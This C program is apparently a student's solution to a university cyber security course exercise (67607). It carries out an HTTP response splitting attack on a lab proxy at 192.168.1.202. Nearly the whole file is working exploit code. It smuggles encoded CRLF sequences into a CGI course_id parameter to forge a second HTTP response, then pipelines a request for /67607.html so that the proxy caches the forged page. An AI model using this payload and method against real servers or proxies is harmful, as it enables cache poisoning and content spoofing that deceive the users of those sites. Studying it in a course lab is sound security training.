/*
 * HTTP Response Splitting Attack
 * Exercise 4 - Cyber Security Course (67607)
 *
 * This program performs an HTTP Response Splitting attack to poison
 * the proxy server cache for the /67607.html page.
 *
 * Compile: gcc -Wall -Wextra -Werror -Wconversion http_response_splitting.c -o
 * attacker_http_response_splitting Run: ./attacker_http_response_splitting
 */

#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>


/* Configuration */
#define PROXY_IP "192.168.1.202"
#define PROXY_PORT 8080
#define BUFFER_SIZE 4096

/*
 * Pre-encoded payload for course_id parameter.
 * Note: %% is used to escape % for snprintf
 *
 * Decoded structure:
 *   dummy\r\n
 *   Content-Length: 0\r\n
 *   \r\n
 *   HTTP/1.1 200 OK\r\n
 *   Content-Type: text/html\r\n
 *   Content-Length: 22\r\n
 *   Last-Modified: Sat, 11 Jan 2025 00:00:00 GMT\r\n
 *   \r\n
 *   <HTML>324807346</HTML>
 */
#define ENCODED_PAYLOAD                                                        \
  "dummy%%0d%%0aContent-Length%%3a%%200%%0d%%0a%%0d%%0a"                       \
  "HTTP%%2f1.1%%20200%%20OK%%0d%%0a"                                           \
  "Content-Type%%3a%%20text%%2fhtml%%0d%%0a"                                   \
  "Content-Length%%3a%%2022%%0d%%0a"                                           \
  "Last-Modified%%3a%%20Sat,%%2011%%20Jan%%202025%%2000%%3a00%%3a00%%20GMT%%"  \
  "0d%%0a"                                                                     \
  "%%0d%%0a"                                                                   \
  "%%3cHTML%%3e324807346%%3c%%2fHTML%%3e"

/*
 * Create a TCP socket and connect to the proxy server
 * Returns socket fd on success, -1 on failure
 */
int connect_to_proxy(void) {
  int sock;
  struct sockaddr_in proxy_addr;

  sock = socket(AF_INET, SOCK_STREAM, 0);
  if (sock < 0) {
    perror("socket");
    return -1;
  }

  memset(&proxy_addr, 0, sizeof(proxy_addr));
  proxy_addr.sin_family = AF_INET;
  proxy_addr.sin_port = htons(PROXY_PORT);

  if (inet_pton(AF_INET, PROXY_IP, &proxy_addr.sin_addr) <= 0) {
    fprintf(stderr, "Invalid proxy IP address: %s\n", PROXY_IP);
    close(sock);
    return -1;
  }

  if (connect(sock, (struct sockaddr *)&proxy_addr, sizeof(proxy_addr)) < 0) {
    perror("connect");
    close(sock);
    return -1;
  }

  return sock;
}

/*
 * Build the malicious HTTP request with response splitting payload.
 */
char *build_malicious_request(size_t *request_len) {
  char request[BUFFER_SIZE];

  /*
   * Combined request:
   * 1. First request with malicious course_id (terminates + injects fake
   * response)
   * 2. Second request for /67607.html (will be matched with fake response)
   */
  int len = snprintf(request, sizeof(request),
                     /* First request - the splitter */
                     "GET /cgi-bin/course_selector?course_id=" ENCODED_PAYLOAD
                     " HTTP/1.1\r\n"
                     "Host: %s:%d\r\n"
                     "Connection: keep-alive\r\n"
                     "\r\n"
                     /* Second request - target to poison */
                     "GET /67607.html HTTP/1.1\r\n"
                     "Host: %s:%d\r\n"
                     "Connection: close\r\n"
                     "\r\n",
                     PROXY_IP, PROXY_PORT, PROXY_IP, PROXY_PORT);

  if (len < 0 || len >= (int)sizeof(request)) {
    fprintf(stderr, "Request buffer overflow\n");
    return NULL;
  }

  char *result = malloc((size_t)len + 1);
  if (!result) {
    perror("malloc");
    return NULL;
  }

  memcpy(result, request, (size_t)len + 1);
  *request_len = (size_t)len;
  return result;
}

/*
 * Send the malicious request and receive responses
 */
int perform_attack(int sock, const char *request, size_t request_len) {
  char response[BUFFER_SIZE * 4];
  ssize_t bytes_sent, bytes_received;

  bytes_sent = send(sock, request, request_len, 0);
  if (bytes_sent < 0) {
    perror("send");
    return -1;
  }

  if ((size_t)bytes_sent != request_len) {
    fprintf(stderr, "Partial send: sent %zd of %zu bytes\n", bytes_sent,
            request_len);
    return -1;
  }

  /* Small delay to ensure both requests are processed */
  usleep(100000); /* 100ms */

  /* Receive responses */
  size_t total_received = 0;
  while ((bytes_received = recv(sock, response + total_received,
                                sizeof(response) - total_received - 1, 0)) >
         0) {
    total_received += (size_t)bytes_received;
    if (total_received >= sizeof(response) - 1) {
      break;
    }
  }

  response[total_received] = '\0';

  /* Check for error indicators */
  if (strstr(response, "502") != NULL) {
    fprintf(stderr, "Received 502 Bad Gateway\n");
    return -1;
  }
  if (strstr(response, "400") != NULL) {
    fprintf(stderr, "Received 400 Bad Request\n");
    return -1;
  }

  return 0;
}

int main(void) {
  int sock;
  char *request;
  size_t request_len;
  int result = 0;

  /* Step 1: Connect to proxy */
  sock = connect_to_proxy();
  if (sock < 0) {
    exit(1);
  }

  /* Step 2: Build the malicious request */
  request = build_malicious_request(&request_len);
  if (!request) {
    close(sock);
    exit(1);
  }

  /* Step 3: Perform the attack */
  if (perform_attack(sock, request, request_len) < 0) {
    result = 1;
  }

  /* Cleanup */
  free(request);
  close(sock);

  if (result != 0) {
    exit(1);
  }

  return 0;
}
